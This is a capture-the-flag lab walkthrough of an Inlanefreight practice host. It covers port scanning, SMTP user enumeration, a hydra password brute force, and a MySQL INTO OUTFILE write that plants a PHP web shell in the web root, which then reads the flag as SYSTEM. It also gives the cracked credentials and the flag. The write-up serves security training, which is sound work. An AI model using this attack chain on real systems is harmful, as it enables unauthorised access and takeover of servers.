# Attacking Common Services - Easy

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

* `HTB{...}`

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

## Walkthrough

```bash
nmap -sV 10.129.44.193
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
25/tcp   open  smtp          hMailServer smtpd
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
443/tcp  open  https
587/tcp  open  smtp          hMailServer smtpd
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

lets enumerate

```bash
sudo echo '10.129.44.193 inlanefreight.htb' >> /etc/hosts
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.44.193 -w 15 
#10.129.44.193: fiona@inlanefreight.htb exists
```

now we try to crack the smtp

```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f 10.129.44.193 smtp -t 64 
#[25][smtp] host: 10.129.44.193   login: fiona@inlanefreight.htb   password: 987654321
```

now with the found credentials lets try to login in https://10.129.44.193

```bash
#login creds fiona:987654321
https://10.129.203.7 #we can upload revershell here but cant run it, find other way
#after searching around we found this
http://10.129.203.7/dashboard/phpinfo.php #C:/xampp/htdocs/dashboard/phpinfo.php 
#C:/xampp/htdocs is the root folder
```

lets try the mysql

```bash
mysql -u fiona -p'987654321' -h 10.129.203.7
#mysql allow to write local file
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/reverse.php ';
#now lets check the webpage
http://10.129.203.7/dashboard/reverse.php
#now lets give it commands
http://10.129.203.7/dashboard/reverse.php?cmd=whoami
#nt authority\system 
```

lets use burp suite for easier further commands

```bash
#capture this request http://10.129.203.7/dashboard/reverse.php?cmd=whoami
#send to repeater
#change the get request(ctrl + u for url encode)
GET /dashboard/reverse.php?cmd=type+C%3a\Users\Administrator\Desktop\flag.txt HTTP/1.1
"HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}"
```
